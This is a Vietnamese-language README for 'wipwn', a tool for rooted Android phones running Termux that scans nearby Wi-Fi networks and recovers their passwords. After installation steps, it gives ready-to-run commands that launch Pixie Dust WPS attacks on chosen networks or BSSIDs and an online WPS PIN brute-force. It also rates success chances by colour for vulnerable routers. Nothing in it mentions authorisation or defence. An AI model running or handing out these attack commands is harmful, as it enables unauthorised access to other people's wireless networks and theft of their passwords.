# WIPWN

![Logo](assets/image.png)

### Quét và xem mật khẩu wifi bằng termux (Root).
    
- [Yêu cầu]
  - [Python](https://www.python.org)
  - [Pixiewps](https://www.kali.org/tools/pixiewps/)
  - [Wpa-supplicant](https://wiki.archlinux.org/title/wpa_supplicant)
 
### Cài đặt :

```bash
pkg update && pkg upgrade -y
pkg install root-repo -y
pkg install git tsu python wpa-supplicant pixiewps iw openssl -y
git clone https://github.com/haidayne/wipwn
cd wipwn
chmod +x main.py
```
# Nhập thủ công và lưu ý:
(Khi mà nó hỏi Y hoặc N tức là nó cần khai báo để lấy cấu hình sử dụng bạn chọn Y thì sẽ tốt hơn và N cũng được không ảnh hưởng gì)

```bash
pkg update && pkg upgrade -y
```
```bash
pkg install root-repo -y
```
```bash
pkg install git tsu python wpa-supplicant pixiewps iw openssl -y
```
```bash
git clone https://github.com/haidayne/wipwn
```
```bash
cd wipwn
```
```bash
chmod +x main.py
```

#### lệnh hỗ trợ :
```bash
sudo python main --help
```
#### Lệnh sử dụng :
```bash
cd wipwn
```

```bash
sudo python main.py -i wlan0 -K
```

#### Ghi chú :
• Tắt mạng, tắt điểm truy cập, bật vị trí
• Màu xanh là tỉ lệ 80% thành công với router đã căn chỉnh wps

• Màu đỏ là 10%

• Màu trắng là 50%

• Màu vàng là 60%

- Hiển thị các mạng khả dụng và bắt đầu tấn công Pixie Dust trên một mạng đã chỉ định.
```bash
sudo python main.py -i wlan0 -K
```

```bash
wipwn.sh
```
- - Bắt đầu tấn công Pixie Dust vào BSSID được chỉ định:
```bash
sudo python main.py -i wlan0 -b 00:91:4C:C3:AC:28 -K
```
- Khởi chạy WPS bruteforce trực tuyến với nửa đầu tiên được chỉ định của mã PIN:
```bash
sudo python main.py -i wlan0 -b 50:0F:F5:B0:08:05 -B -p 1234
```
### Xử lý sự cố
**"Thiết bị hoặc tài nguyên đang bận (-16)" - Bật Wifi rồi tắt Wifi.**

---

## Ảnh chụp màn hình

| Banner | Cracked | Saved Data | config.txt | 
| :---: | :---: | :---: | :---: |
| ![image](https://raw.githubusercontent.com/anbuinfosec/anbuinfosec/refs/heads/main/assets/wipwn/1.jpg) | ![image](https://raw.githubusercontent.com/anbuinfosec/anbuinfosec/refs/heads/main/assets/wipwn/2.jpg) | ![image](https://raw.githubusercontent.com/anbuinfosec/anbuinfosec/refs/heads/main/assets/wipwn/3.jpg) | ![image](https://raw.githubusercontent.com/anbuinfosec/anbuinfosec/refs/heads/main/assets/wipwn/4.jpg) |


### ❤️ Cảm ơn vì những ngôi sao và forks
[![Stargazers repo danh sách cho @anbuinfosec/wipwn](https://reporoster.com/stars/dark/anbuinfosec/wipwn)](https://github.com/anbuinfosec/wipwn/stargazers)
[![Forkers repo roster for @anbuinfosec/wipwn](https://reporoster.com/forks/dark/anbuinfosec/wipwn)](https://github.com/anbuinfosec/wipwn/network/members)
